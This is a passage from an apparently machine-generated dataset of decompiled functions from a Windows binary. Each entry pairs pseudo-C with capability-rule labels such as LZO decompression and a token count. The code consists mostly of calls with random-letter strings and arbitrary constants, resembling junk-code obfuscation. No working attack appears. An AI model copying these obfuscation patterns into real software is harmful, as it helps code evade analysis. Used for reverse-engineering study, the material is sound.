fcn.00401e79(*(puVar2 + -0x1c));\n    *(puVar2 + -0x20) = 0x42a455;\n    fcn.0040426e(*(puVar2 + -0x1c));\n    puVar2 = var_bch;\n    var_cch = var_bch + -0x24;\n    puVar5 = var_bch + -0x24;\n    puVar6 = var_bch + -0x24;\n    var_c8h = var_bch + -0x24;\n    *(var_bch + -4) = 0x40f4faf0;\n    *(puVar2 + -8) = 0;\n    *(puVar2 + -0xc) = 0x40e2a9e0;\n    *(puVar2 + -0x10) = 0;\n    *(puVar2 + -0x14) = 0x40e1d800;\n    *(puVar2 + -0x18) = 0;\n    *(puVar2 + -0x1c) = 0x40dce5c0;\n    *(puVar2 + -0x20) = 0;\n    *puVar5 = 1;\n    *(puVar2 + -0x28) = 0x42a4b3;\n    fcn.00405c81(*puVar6, *(puVar2 + -0x20), *(puVar2 + -0x1c), *(puVar2 + -0x18), *(puVar2 + -0x14), *(puVar2 + -0x10)\n                 , *(puVar2 + -0xc), *(puVar2 + -8));\n    var_c4h = puVar2 + -0x60;\n    var_c0h = puVar2 + -0x3c;\n    *(puVar2 + -100) = \"uwpuybugpppxzp\";\n    *(puVar2 + -0x68) = 0x42a4e3;\n    fcn.00401e79(*(puVar2 + -100));\n    var_10h = 0xb;\n    *(puVar2 + -0x68) = \"zwmcjydzwspzkmerbjmogbmbhcszctqytboziasobiizoohpevyfjlrqmdmcwipcqduuqkpdisdizge\";\n    *(puVar2 + -0x6c) = 0x42a508;\n    fcn.00401e79(*(puVar2 + -0x68));\n    puVar3 = var_c4h;\n    *var_c4h = 0x8cd;\n    puVar3[2] = 0x40ddec00;\n    puVar3[1] = 0;\n    var_10h = 2;\n    *(puVar2 + -0x6c) = 0x42a539;\n    fcn.0040174e(*(puVar2 + -0x68));\n    puVar4 = var_c8h;\n    var_d4h = var_c8h;\n    *(var_c8h + -4) = var_c8h;\n    var_d0h = puVar4 + -0x24;\n    *(puVar4 + -0x28) = \"mztnznvycasdpgk\";\n    *(puVar4 + -0x2c) = 0x42a56e;\n    fcn.00401e79(*(puVar4 + -0x28));\n    puVar2 = var_d0h;\n    *(var_d0h + 0x18) = 0x130f;\n    *(puVar2 + 0x1c) = 0x1dec;\n    puVar2[0x20] = 1;\n    *(puVar4 + -0x2c) = 0x42a596;\n    fcn.00401e1f(*(puVar4 + -0x28));\n    puVar2 = var_d4h;\n    puVar7 = var_d4h + -0x18;\n    puVar8 = var_d4h + -0x18;\n    var_e0h = var_d4h + -0x18;\n    puVar9 = var_d4h + -0x18;\n    *(var_d4h + -0x10) = 0x40c89d80;\n    *(puVar2 + -0x14) = 0;\n    *(puVar2 + -4) = 1;\n    *(puVar2 + -8) = 1;\n    *(puVar2 + -0xc) = 1;\n    *puVar7 = 1;\n    *(puVar2 + -0x1c) = 0x42a5dc;\n    fcn.00402180(*puVar8, *(puVar2 + -0x14), *(puVar2 + -0x10), *(puVar2 + -0xc), *(puVar2 + -8), *(puVar2 + -4));\n    *(puVar2 + -0x1c) = puVar9;\n    var_dch = puVar2 + -0x7c;\n    var_d8h = puVar2 + -0x34;\n    *(puVar2 + -0x80) = \"fzsxbibkjjmtodlpkfemfilhxzhwazflwjzcrborf\";\n    *(puVar2 + -0x84) = 0x42a610;\n    fcn.00401e79(*(puVar2 + -0x80));\n    var_e4h = var_dch + 0xb;\n    var_10h = 9;\n    *(puVar2 + -0x84) = \"qdsyhebkasmxophtbjgmqymglvhyzzrtlozpkpmdkxuy\";\n    *(puVar2 + -0x88) = 0x42a63b;\n    fcn.00401e79(*(puVar2 + -0x84));\n    var_10h = 10;\n    *(puVar2 + -0x88) = \"pcbymrtkzvltbcevfyspsphnbfhpusmsnll\";\n    *(puVar2 + -0x8c) = 0x42a660;\n    fcn.00401e79(*(puVar2 + -0x88));\n    puVar3 = var_dch;\n    *var_dch = 0x57e;\n    puVar3[7] = 0xd19;\n    puVar3[8] = 0xc9b;\n    puVar3[10] = 0x40f71aa0;\n    puVar3[9] = 0;\n    puVar3[0x11] = 0x879;\n    puVar3[0x18] = 0x6b4;\n    var_10h = 2;\n    *(puVar2 + -0x8c) = 0x42a6ad;\n    fcn.00402af9(*(puVar2 + -0x88));\n    puVar2 = var_e0h;\n    puVar10 = var_e0h + -4;\n    var_f0h = var_e0h + -4;\n    puVar11 = var_e0h + -4;\n    *(var_e0h + -4) = 0;\n    *(puVar2 + -8) = 0x42a6d0;\n    fcn.00403b89(*puVar10);\n    *(puVar2 + -8) = puVar11;\n    var_ech = puVar2 + -0x6c;\n    var_e8h = puVar2 + -0x28;\n    *(puVar2 + -0x70) = \"wuwmmmihrsdyjfsrxxilhkkrinfjdnkkgwhkcuyobozghsdqybbdjgra\";\n    *(puVar2 + -0x74) = 0x42a706;\n    fcn.00401e79(*(puVar2 + -0x70));\n    var_f4h = var_ech + 10;\n    var_10h = 7;\n    *(puVar2 + -0x74) = \"zfiauxahcglpbpevwjcxwpenfjneyjoyawcigdjfsqiunaratixuaarrwmcdrsaqmurl\";\n    *(puVar2 + -0x78) = 0x42a731;\n    fcn.00401e79(*(puVar2 + -0x74));\n    var_10h = 8;\n    *(puVar2 + -0x78) = \"uedpxoerbfbxhhtesng\";\n    *(puVar2 + -0x7c) = 0x42a756;\n    fcn.00401e79(*(puVar2 + -0x78));\n    puVar3 = var_ech;\n    var_ech[1] = 0x40d800c0;\n    *puVar3 = 0;\n    puVar3[2] = 0x48;\n    puVar3[3] = 0x1920;\n    *(puVar3 + 0x10) = 1;\n    puVar3[0x17] = 0xae8;\n    *(puVar3 + 0x18) = 0;\n    *(puVar3 + 0x19) = 1;\n    var_10h = 2;\n    *(puVar2 + -0x7c) = 0x42a7a1;\n    fcn.00404912(*(puVar2 + -0x78));\n    puVar4 = var_f0h;\n    var_fch = var_f0h;\n    *(var_f0h + -4) = var_f0h;\n    var_f8h = puVar4 + -0x38;\n    *(puVar4 + -0x3c) = \"zqfmjpfvicgqxtmgpgurseoytujlwuvxqygieqyatnbwnjxbm\";\n    *(puVar4 + -0x40) = 0x42a7d9;\n    fcn.00401e79(*(puVar4 + -0x3c));\n    puVar2 = var_f8h;\n    *var_f8h = 1;\n    *(puVar2 + 8) = 0x40bdba00;\n    *(puVar2 + 4) = 0;\n    puVar2[0x24] = 1;\n    *(puVar2 + 0x2c) = 0x40dc80c0;\n    *(puVar2 + 0x28) = 0;\n    *(puVar2 + 0x30) = 0x1c47;\n    puVar2[0x34] = 0;\n    *(puVar4 + -0x40) = 0x42a81d;\n    fcn.0040165e(*(puVar4 + -0x3c));\n    puVar4 = var_fch;\n    puVar12 = var_fch + -4;\n    var_108h = var_fch + -4;\n    *(var_fch + -4) = 0xd96;\n    *(puVar4 + -8) = 0x42a842;\n    fcn.0040247d(*puVar12);\n    var_104h = puVar4 + -0x44;\n    var_100h = puVar4 + -0x2c;\n    *(puVar4 + -0x48) = \"lmkgzhozscomxzsewtxlaofppduajgxqzxxapasowgzxdiaszym\";\n    *(puVar4 + -0x4c) = 0x42a870;\n    fcn.00401e79(*(puVar4 + -0x48));\n    var_10h = 6;\n    *(puVar4 + -0x4c) = \"ncognbwlkqrcshbxuepefclasokjrpjnoursjqvfkopaqbnbtydibidepytgpvlluy\";\n    *(puVar4 + -0x50) = 0x42a892;\n    fcn.00401e79(*(puVar4 + -0x4c));\n    puVar2 = var_104h;\n    *(var_104h + 0x34) = 0x40ebf380;\n    *(puVar2 + 0x30) = 0;\n    puVar2[0x38] = 1;\n    puVar2[0x3c] = 0;\n    *(puVar4 + -0x50) = 0x42a8be;\n    fcn.004037a6(*(puVar4 + -0x4c));\n    puVar2 = var_108h;\n    var_114h = var_108h;\n    *(var_108h + -4) = var_108h;\n    var_110h = puVar2 + -0x68;\n    var_10ch = puVar2 + -0x1c;\n    var_10h = 2;\n    *(puVar2 + -0x6c) = \"vwwwyiimcxnaumdfuodqjiaqprrzrgsqnvoxnmyxfanojmthadarlicjfsdrqjhmghxudllegxpraswannhwloij\";\n    *(puVar2 + -0x70) = 0x42a8fe;\n    fcn.00401e79(*(puVar2 + -0x6c));\n    var_118h = var_110h + 9;\n    var_10h = 4;\n    *(puVar2 + -0x70) = \"cdpsydpdhaatipodshgzysuhmkmyrtyeongtaufgejyhhsshpeggyfiqkktydt\";\n    *(puVar2 + -0x74) = 0x42a929;\n    fcn.00401e79(*(puVar2 + -0x70));\n    var_10h = 5;\n    *(puVar2 + -0x74) = \"svvdhjwznmswhpoeovpjurheffmxcxcbvaupqy\";\n    *(puVar2 + -0x78) = 0x42a94e;\n    fcn.00401e79(*(puVar2 + -0x74));\n    puVar3 = var_110h;\n    var_110h[1] = 0x40c71600;\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    *(puVar3 + 0xf) = 0;\n    puVar3[0x10] = 0x5d8;\n    puVar3[0x12] = 0x40ac6000;\n    puVar3[0x11] = 0;\n    puVar3[0x19] = 0x3b9;\n    var_10h = 2;\n    *(puVar2 + -0x78) = 0x42a99c;\n    fcn.00405c59(*(puVar2 + -0x74));\n    puVar2 = var_114h;\n    puVar13 = var_114h + -8;\n    puVar14 = var_114h + -8;\n    *(var_114h + -4) = 0;\n    *puVar13 = 0xaa7;\n    *(puVar2 + -0xc) = 0x42a9c8;\n    fcn.00401866(*puVar14, *(puVar2 + -4));\n    var_124h = puVar2 + -0x24;\n    *(puVar2 + -0xc) = 0x4093e000;\n    *(puVar2 + -0x10) = 0;\n    *(puVar2 + -0x14) = 0x40c8d900;\n    *(puVar2 + -0x18) = 0;\n    *(puVar2 + -0x1c) = 0x40a63a00;\n    *(puVar2 + -0x20) = 0;\n    *(puVar2 + -0x24) = 0xfb4;\n    *(puVar2 + -0x28) = 0x42aa08;\n    fcn.00405664(*(puVar2 + -0x24), *(puVar2 + -0x20), *(puVar2 + -0x1c), *(puVar2 + -0x18), *(puVar2 + -0x14), \n                 *(puVar2 + -0x10));\n    var_120h = puVar2 + -0x60;\n    var_11ch = puVar2 + -0x44;\n    *(puVar2 + -100) = \"vhaqcvuptdrkjldxqrmrc\";\n    *(puVar2 + -0x68) = 0x42aa36;\n    fcn.00401e79(*(puVar2 + -100));\n    var_10h = 3;\n    *(puVar2 + -0x68) = \"thfryjcqvyglpyvhqrhiynjfvhjhfdwvgcfamrycrqujowioggghk\";\n    *(puVar2 + -0x6c) = 0x42aa5b;\n    fcn.00401e79(*(puVar2 + -0x68));\n    piVar1 = var_120h;\n    *var_120h = &fcn.0042a170::var_68h;\n    piVar1[0xd] = 0xd46;\n    *(piVar1 + 0xe) = 0;\n    var_10h = 2;\n    *(puVar2 + -0x6c) = 0x42aa88;\n    fcn.004025c7(*(puVar2 + -0x68));\n    puVar2 = var_124h;\n    *(var_124h + -4) = 0x42aa9d;\n    fcn.00403b02();\n    var_12ch = puVar2;\n    var_128h = puVar2 + -0x24;\n    *(puVar2 + -0x28) = \"utmbadtrhofenrsnfkffpnussoowmqzzlxdsurszzoabvuruqdonxfabmnpvu\";\n    *(puVar2 + -0x2c) = 0x42aac5;\n    fcn.00401e79(*(puVar2 + -0x28));\n    piVar1 = var_128h;\n    *var_128h = &fcn.0042a170::var_80h;\n    piVar1[2] = 0x40f48c10;\n    piVar1[1] = 0;\n    *(puVar2 + -0x2c) = 0x42aaee;\n    fcn.004029a5(*(puVar2 + -0x28));\n    *(var_12ch + -4) = 0x42ab03;\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return var_90h;\n}\n",
        "token_count": 6589
    },
    "0042cd30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __fastcall fcn.0042cd30(int32_t param_1)\n\n{\n    uint *puVar1;\n    uchar *puVar2;\n    uchar *puVar3;\n    uint *puVar4;\n    uint *puVar7;\n    uint *puVar9;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h;\n    uint auStack248 [7];\n    uchar auStack220 [48];\n    uint uStack172;\n    uchar *var_a4h;\n    uint *var_a0h;\n    uchar *var_9ch;\n    uint *var_98h;\n    uchar *var_94h;\n    uchar *var_90h;\n    uchar *var_8ch;\n    uchar *var_88h;\n    uchar *var_84h;\n    uchar *var_80h;\n    uchar *var_7ch;\n    uint *var_78h;\n    uchar *var_74h;\n    uchar *var_70h;\n    uchar *var_6ch;\n    uchar *var_68h;\n    uchar *var_64h;\n    uint *var_60h;\n    uchar *var_5ch;\n    uchar *var_58h;\n    uint *var_54h;\n    uchar *var_50h;\n    uchar *var_4ch;\n    uchar *var_48h;\n    uint *var_44h;\n    uchar *var_40h;\n    uint *var_3ch;\n    uchar *var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uchar *var_24h;\n    int32_t var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *puVar5;\n    uchar *puVar6;\n    uint *puVar8;\n    \n    var_1ch = &fcn.0042cd30::var_a4h;\n    var_2ch = &fcn.0042cd30::var_a4h;\n    var_10h = 0xffffffff;\n    var_14h = 0x4501a0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0042cd30::var_18h;\n    var_30h = param_1 + 0xc;\n    uStack172 = 0x42cd76;\n    var_34h = param_1;\n    var_20h = param_1;\n    fcn.004040a7();\n    var_28h = &stack0xffffff08;\n    var_24h = &stack0xffffff24;\n    var_10h = 0;\n    fcn.00401e79(\"ztvskxgfgdbfwvrwfwrduuohorpunetsgaucgizjtwkmgcsehmzkktjjrktpxkmxynsnrklvbsldqjrurtthviexblehirs\");\n    var_10h = 8;\n    arg_8h = \"eixruvhhizfagpkelwrayddgycmvssbpwtbcdhsfsblutzdltdlkuwhuqccjadwinjiamtdesltqqrutakwwtbeotuqzx\";\n    fcn.00401e79(\"eixruvhhizfagpkelwrayddgycmvssbpwtbcdhsfsblutzdltdlkuwhuqccjadwinjiamtdesltqqrutakwwtbeotuqzx\");\n    puVar1 = var_28h;\n    *var_28h = 0x1a3;\n    *(puVar1 + 0xd) = 1;\n    *(puVar1 + 0xe) = 0;\n    puVar1[0xf] = 0x905;\n    *(puVar1 + 0x10) = 1;\n    puVar1[0x12] = 0x40b5c000;\n    puVar1[0x11] = 0;\n    *(puVar1 + 0x13) = 0;\n    var_10h = 0;\n    fcn.004057cc(arg_8h);\n    puVar2 = var_2ch;\n    var_40h = var_2ch;\n    *(var_2ch + -4) = var_2ch;\n    var_3ch = puVar2 + -0x6c;\n    var_38h = puVar2 + -0x24;\n    *(puVar2 + -0x70) = \"ndmxjgfzltzypmrcikyftjovxhbrnugtbqmffktdtkblvoblnkfxwmfshbimknuswjpgavkgpmfdufpxnp\";\n    *(puVar2 + -0x74) = 0x42ce36;\n    fcn.00401e79(*(puVar2 + -0x70));\n    var_44h = var_3ch + 7;\n    var_10h = 6;\n    *(puVar2 + -0x74) = \"banpr\";\n    *(puVar2 + -0x78) = 0x42ce5b;\n    fcn.00401e79(*(puVar2 + -0x74));\n    var_10h = 7;\n    *(puVar2 + -0x78) = \"ecqdnpqtjnmlatgjzwxudhwcsflhkqafup\";\n    *(puVar2 + -0x7c) = 0x42ce7d;\n    fcn.00401e79(*(puVar2 + -0x78));\n    puVar1 = var_3ch;\n    *var_3ch = 0x686;\n    puVar1[0xe] = 0x40da6080;\n    puVar1[0xd] = 0;\n    *(puVar1 + 0xf) = 0;\n    *(puVar1 + 0x10) = 1;\n    puVar1[0x11] = 0x1034;\n    *(puVar1 + 0x18) = 1;\n    puVar1[0x1a] = 0x40de0d80;\n    puVar1[0x19] = 0;\n    var_10h = 0;\n    *(puVar2 + -0x7c) = 0x42cec9;\n    fcn.0040542a(*(puVar2 + -0x78));\n    puVar3 = var_40h;\n    *(var_40h + -4) = 0x42cedb;\n    fcn.00405d17();\n    var_50h = puVar3;\n    var_4ch = puVar3 + -0x38;\n    var_48h = puVar3 + -0x20;\n    *(puVar3 + -0x3c) = \"zpsentackjzhhpoufyryzprn\";\n    *(puVar3 + -0x40) = 0x42cf05;\n    fcn.00401e79(*(puVar3 + -0x3c));\n    var_10h = 5;\n    *(puVar3 + -0x40) = \"guvsemhipwgwlfwvrpslgbfrlskweuhgulkzpfzvskeiftyasvukmmzjnyqipknha\";\n    *(puVar3 + -0x44) = 0x42cf24;\n    fcn.00401e79(*(puVar3 + -0x40));\n    puVar2 = var_4ch;\n    *(var_4ch + 0x34) = 0x40d4b4c0;\n    *(puVar2 + 0x30) = 0;\n    var_10h = 0;\n    *(puVar3 + -0x44) = 0x42cf49;\n    fcn.00403297(*(puVar3 + -0x40));\n    puVar2 = var_50h;\n    puVar4 = var_50h + -0x10;\n    puVar5 = var_50h + -0x10;\n    var_58h = var_50h + -0x10;\n    puVar6 = var_50h + -0x10;\n    *(var_50h + -4) = 0x3bc;\n    *(puVar2 + -8) = 0;\n    *(puVar2 + -0xc) = 0;\n    *puVar4 = 0x539;\n    *(puVar2 + -0x14) = 0x42cf7b;\n    fcn.004066a4(*puVar5, *(puVar2 + -0xc), *(puVar2 + -8), *(puVar2 + -4));\n    *(puVar2 + -0x14) = puVar6;\n    var_54h = puVar2 + -0x2c;\n    *(puVar2 + -0x30) = \"tfqvxxnsybdxnyqmhltewuxvgtwmkmkawvojtkoyulitf\";\n    *(puVar2 + -0x34) = 0x42cfa3;\n    fcn.00401e79(*(puVar2 + -0x30));\n    *var_54h = 0x282;\n    *(puVar2 + -0x34) = 0x42cfb9;\n    fcn.0040456b(*(puVar2 + -0x30));\n    puVar2 = var_58h;\n    var_5ch = var_58h + -0x20;\n    puVar7 = var_58h + -0x20;\n    puVar8 = var_58h + -0x20;\n    *(var_58h + -0x10) = 0x40ef40e0;\n    *(puVar2 + -0x14) = 0;\n    *(puVar2 + -0x1c) = 0x40bafb00;\n    *puVar7 = 0;\n    *(puVar2 + -4) = 0x397;\n    *(puVar2 + -8) = 1;\n    *(puVar2 + -0xc) = 0x49c;\n    *(puVar2 + -0x18) = 1;\n    *(puVar2 + -0x24) = 0x42d007;\n    fcn.00406988(*puVar8, *(puVar2 + -0x1c), *(puVar2 + -0x18), *(puVar2 + -0x14), *(puVar2 + -0x10), *(puVar2 + -0xc), \n                 *(puVar2 + -8), *(puVar2 + -4));\n    var_64h = puVar2 + -0x2c;\n    *(puVar2 + -0x24) = 0x40e76340;\n    *(puVar2 + -0x28) = 0;\n    *(puVar2 + -0x2c) = 0x8a6;\n    *(puVar2 + -0x30) = 0x42d02d;\n    fcn.004062c1(*(puVar2 + -0x2c), *(puVar2 + -0x28));\n    var_60h = puVar2 + -0x54;\n    *(puVar2 + -0x58) = \"mmradxthcypgudywmoeqvcqfgorkhbxuxnsrbktgtrlwvkikobxppbrpreeunyilhoqdyjlotccmbnzkzcrthb\";\n    *(puVar2 + -0x5c) = 0x42d051;\n    fcn.00401e79(*(puVar2 + -0x58));\n    puVar1 = var_60h;\n    *var_60h = 0x162b;\n    *(puVar1 + 7) = 1;\n    puVar1[8] = 0x11a8;\n    puVar1[9] = 0x1da6;\n    *(puVar2 + -0x5c) = 0x42d079;\n    fcn.00405826(*(puVar2 + -0x58));\n    puVar3 = var_64h;\n    var_70h = var_64h;\n    *(var_64h + -4) = var_64h;\n    var_6ch = puVar3 + -100;\n    var_68h = puVar3 + -0x18;\n    *(puVar3 + -0x68) =\n         \"seuombrkypggelkrkxtjnnjaitewvezzfdccdrqyctxlkuthuubrkkxbqmmrvxfmvhasfqmycfgpwlmuuwhitjriljksauchn\";\n    *(puVar3 + -0x6c) = 0x42d0ab;\n    fcn.00401e79(*(puVar3 + -0x68));\n    var_74h = var_6ch + 0x28;\n    var_10h = 3;\n    *(puVar3 + -0x6c) = \"xvykocuypjnysodpcgzidynegkyjiphfkqeuzqegiottmz\";\n    *(puVar3 + -0x70) = 0x42d0d0;\n    fcn.00401e79(*(puVar3 + -0x6c));\n    var_10h = 4;\n    *(puVar3 + -0x70) = \"ephgxkxndbl\";\n    *(puVar3 + -0x74) = 0x42d0f2;\n    fcn.00401e79(*(puVar3 + -0x70));\n    puVar2 = var_6ch;\n    *var_6ch = 1;\n    puVar2[4] = 0;\n    *(puVar2 + 8) = 0x1b9b;\n    puVar2[0x24] = 1;\n    *(puVar2 + 0x40) = 0x10c6;\n    *(puVar2 + 0x48) = 0x40cbd300;\n    *(puVar2 + 0x44) = 0;\n    var_10h = 0;\n    *(puVar3 + -0x74) = 0x42d130;\n    fcn.00405c4a(*(puVar3 + -0x70));\n    puVar2 = var_70h;\n    var_7ch = var_70h;\n    *(var_70h + -4) = var_70h;\n    var_78h = puVar2 + -0x2c;\n    *(puVar2 + -0x30) = \"yhowuezfzullzdpwdpinmalqskhwjzjfjfehkc\";\n    *(puVar2 + -0x34) = 0x42d15d;\n    fcn.00401e79(*(puVar2 + -0x30));\n    puVar1 = var_78h;\n    var_78h[1] = 0x40dbc400;\n    *puVar1 = 0;\n    puVar1[2] = 0x11;\n    puVar1[9] = 0x1d37;\n    puVar1[10] = 0xebc;\n    *(puVar2 + -0x34) = 0x42d18f;\n    fcn.004053a3(*(puVar2 + -0x30));\n    puVar3 = var_7ch;\n    var_88h = var_7ch;\n    *(var_7ch + -4) = var_7ch;\n    var_84h = puVar3 + -0x50;\n    var_80h = puVar3 + -0x18;\n    *(puVar3 + -0x54) = \"antxilgcrnxdddtutnftycmzpurxybsdoulmxfjsdaaq\";\n    *(puVar3 + -0x58) = 0x42d1c2;\n    fcn.00401e79(*(puVar3 + -0x54));\n    var_10h = 2;\n    *(puVar3 + -0x58) = \"hxidpsotkxdwbikiel\";\n    *(puVar3 + -0x5c) = 0x42d1e7;\n    fcn.00401e79(*(puVar3 + -0x58));\n    puVar2 = var_84h;\n    *var_84h = 1;\n    *(puVar2 + 4) = 0x2a0;\n    puVar2[8] = 0;\n    puVar2[0xc] = 1;\n    *(puVar2 + 0x10) = 0x16bc;\n    puVar2[0x2c] = 1;\n    *(puVar2 + 0x34) = 0x40cd7a80;\n    *(puVar2 + 0x30) = 0;\n    var_10h = 0;\n    *(puVar3 + -0x5c) = 0x42d22c;\n    fcn.00405a1a(*(puVar3 + -0x58));\n    puVar3 = var_88h;\n    var_90h = var_88h;\n    *(var_88h + -4) = var_88h;\n    var_8ch = puVar3 + -0x20;\n    *(puVar3 + -0x24) = \"mtstfoauqwjjekmpkwwtburkvilqjsqxujfjydfcrdgul\";\n    *(puVar3 + -0x28) = 0x42d25f;\n    fcn.00401e79(*(puVar3 + -0x24));\n    puVar2 = var_8ch;\n    *(var_8ch + 0x1c) = 0x40d6d440;\n    *(puVar2 + 0x18) = 0;\n    *(puVar3 + -0x28) = 0x42d280;\n    fcn.004043c7(*(puVar3 + -0x24));\n    puVar2 = var_90h;\n    puVar9 = var_90h + -4;\n    *(var_90h + -4) = 1;\n    *(puVar2 + -8) = 0x42d29b;\n    fcn.004051ff(*puVar9);\n    *(puVar2 + -8) = 0x42d2a8;\n    fcn.004066c2();\n    *(puVar2 + -8) = 0;\n    *(puVar2 + -0xc) = 0x42d2bb;\n    fcn.004039ea(*(puVar2 + -8));\n    var_9ch = puVar2 + -0x14;\n    *(puVar2 + -0xc) = 0;\n    *(puVar2 + -0x10) = 0x3ea;\n    *(puVar2 + -0x14) = 1;\n    *(puVar2 + -0x18) = 0x42d2e1;\n    fcn.00402a5e(*(puVar2 + -0x14), *(puVar2 + -0x10), *(puVar2 + -0xc));\n    *(puVar2 + -0x18) = puVar2 + -0x14;\n    var_98h = puVar2 + -0x58;\n    var_94h = puVar2 + -0x2c;\n    *(puVar2 + -0x5c) = \"zyjxabavrenwqvwrilmwebearuxrwnzcwnvwtveir\";\n    *(puVar2 + -0x60) = 0x42d315;\n    fcn.00401e79(*(puVar2 + -0x5c));\n    var_10h = 1;\n    *(puVar2 + -0x60) = \"ptozbfwyny\";\n    *(puVar2 + -100) = 0x42d33a;\n    fcn.00401e79(*(puVar2 + -0x60));\n    puVar1 = var_98h;\n    var_98h[1] = 0x40db0dc0;\n    *puVar1 = 0;\n    puVar1[8] = 0x1440;\n    puVar1[10] = 0x40ea5440;\n    puVar1[9] = 0;\n    *(puVar2 + -100) = 0x42d36f;\n    fcn.004061a4(*(puVar2 + -0x60));\n    puVar2 = var_9ch;\n    var_a4h = var_9ch;\n    *(var_9ch + -4) = var_9ch;\n    var_a0h = puVar2 + -0x24;\n    var_10h = 0;\n    *(puVar2 + -0x28) = \"eyegmkyknpexhhftkmskefeoirsmydclnszzjpmzbkitwfyebbpmxovetqnftrklcjfjuxxsypqbjynpprqxwzb\";\n    *(puVar2 + -0x2c) = 0x42d3a7;\n    fcn.00401e79(*(puVar2 + -0x28));\n    puVar1 = var_a0h;\n    *var_a0h = 0xfe;\n    puVar1[7] = 0x1aa;\n    puVar1[8] = 0x1102;\n    *(puVar2 + -0x2c) = 0x42d3ce;\n    fcn.0040478c(*(puVar2 + -0x28));\n    *in_FS_OFFSET = var_18h;\n    return var_34h;\n}\n",
        "token_count": 4984
    },
    "0042edc0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __fastcall fcn.0042edc0(int32_t param_1)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h;\n    uint auStack388 [8];\n    uchar auStack356 [28];\n    uchar *puStack328;\n    uchar *var_f8h;\n    uchar *var_f4h;\n    uchar *var_f0h;\n    uchar *var_ech;\n    uint *var_e8h;\n    int32_t *var_e4h;\n    int32_t *var_e0h;\n    uchar *var_dch;\n    int32_t *var_d8h;\n    uchar *var_d4h;\n    uchar *var_d0h;\n    int32_t *var_cch;\n    uchar *var_c8h;\n    uchar *var_c4h;\n    uchar *var_c0h;\n    int32_t *var_bch;\n    uchar *var_b8h;\n    uint *var_b4h;\n    uchar *var_b0h;\n    uint *var_ach;\n    uchar *var_a8h;\n    uint *var_a4h;\n    uint *var_a0h;\n    uchar *var_9ch;\n    uint *var_98h;\n    uchar *var_94h;\n    uchar *var_90h;\n    uchar *var_8ch;\n    uchar *var_88h;\n    uchar *var_84h;\n    uchar *var_80h;\n    uint *var_7ch;\n    uchar *var_78h;\n    int32_t var_74h;\n    int32_t var_70h;\n    uchar *var_6ch;\n    uint var_68h;\n    uint var_50h;\n    uint var_38h;\n    int32_t var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    var_1ch = &fcn.0042edc0::var_f8h;\n    var_10h = 0xffffffff;\n    var_14h = 0x450300;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0042edc0::var_18h;\n    var_74h = param_1 + 0x18;\n    var_70h = param_1;\n    var_20h = param_1;\n    fcn.004040a7();\n    fcn.00401997(0);\n    var_10h = 0;\n    var_6ch = &stack0xfffffebc;\n    var_80h = &stack0xfffffebc;\n    puStack328 = 0x42eea6;\n    fcn.004043db(1, 0, 0x40ed74c0, 0, 0, 0x40d21f80, 1, 0, 0x40beb900, 0, 0x40e006c0, 0, 0x40bd2300, 0, 0x40ecbd80, 1);\n    var_7ch = &stack0xfffffe7c;\n    var_78h = &stack0xfffffe9c;\n    puStack328 = &stack0xfffffebc;\n    fcn.00401e79(\"npqitviuufwzpkxscusefcxlzfzszjcdevytxxfvkibspmywintjaxyjzjchcyupghdhdkuntantfogziemzfyqp\");\n    var_10h = 0xb;\n    arg_8h = \"hqfrztuzvuyatltjoklvvvexsruxxhjdtimvrrpnuianxezpxklwzqdyingorqfqukn\";\n    fcn.00401e79(\"hqfrztuzvuyatltjoklvvvexsruxxhjdtimvrrpnuianxezpxklwzqdyingorqfqukn\");\n    puVar3 = var_7ch;\n    *var_7ch = 0x60;\n    puVar3[7] = 0x25f;\n    puVar3[0xf] = 0x40d11a40;\n    puVar3[0xe] = 0;\n    var_10h = 0;\n    fcn.004048cc(arg_8h);\n    puVar2 = var_80h;\n    var_88h = var_80h;\n    *(var_80h + -4) = var_80h;\n    var_84h = puVar2 + -0x3c;\n    *(puVar2 + -0x40) = \"fwrzhrnhgaekmrdvfpaurjbgsjyveps\";\n    *(puVar2 + -0x44) = 0x42ef5c;\n    fcn.00401e79(*(puVar2 + -0x40));\n    puVar1 = var_84h;\n    *var_84h = 1;\n    *(puVar1 + 4) = 0x19b;\n    *(puVar1 + 0xc) = 0x40e337e0;\n    *(puVar1 + 8) = 0;\n    puVar1[0x10] = 1;\n    puVar1[0x14] = 0;\n    *(puVar1 + 0x34) = 0x40f06510;\n    *(puVar1 + 0x30) = 0;\n    puVar1[0x38] = 0;\n    *(puVar2 + -0x44) = 0x42efa1;\n    fcn.00401857(*(puVar2 + -0x40));\n    puVar2 = var_88h;\n    var_90h = var_88h;\n    *(var_88h + -4) = var_88h;\n    var_8ch = puVar2 + -0x40;\n    *(puVar2 + -0x44) = \"thraorrhenmlxoeysjjdsoewflipceoftpkiznzouawmdkjmnxzknjtxzdqkxailkkvrmenim\";\n    *(puVar2 + -0x48) = 0x42efd7;\n    fcn.00401e79(*(puVar2 + -0x44));\n    puVar1 = var_8ch;\n    *var_8ch = 0;\n    *(puVar1 + 8) = 0x408b4000;\n    *(puVar1 + 4) = 0;\n    puVar1[0x24] = 1;\n    *(puVar1 + 0x2c) = 0x40b6b600;\n    *(puVar1 + 0x28) = 0;\n    puVar1[0x30] = 1;\n    *(puVar1 + 0x38) = 0x40b4d800;\n    *(puVar1 + 0x34) = 0;\n    puVar1[0x3c] = 0;\n    *(puVar2 + 